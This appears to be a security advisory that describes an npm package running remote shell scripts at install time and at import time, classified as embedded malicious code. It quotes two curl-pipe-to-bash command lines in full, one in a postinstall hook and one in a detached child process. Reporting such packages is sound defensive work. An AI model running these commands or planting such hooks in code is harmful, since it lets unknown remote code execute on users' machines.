summary: Install-time and import-time curl|bash from unpinned external URLs
details: The package executes attacker-controlled remote shell scripts at two distinct trigger points. (1) package.json declares a postinstall hook `curl -fsSL https://web.stanford.edu/~pseay/test | bash`, which fires automatically on `npm install` and pipes whatever bytes the URL serves directly into bash with the installer's privileges. The destination is a personal Stanford user webpage unrelated to the declared publisher, is not version-pinned, and has no hash verification. (2) src/index.js invokes addSupport() at the bottom of the module, which dynamically imports child_process and spawns a detached `bash -c 'curl -fsSL https://example.com/script.sh | bash'` on every require/import of the package. Both URLs are mutable and externally controlled; the pattern itself is remote-fetch-and-execute regardless of what the endpoints serve at any given moment.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
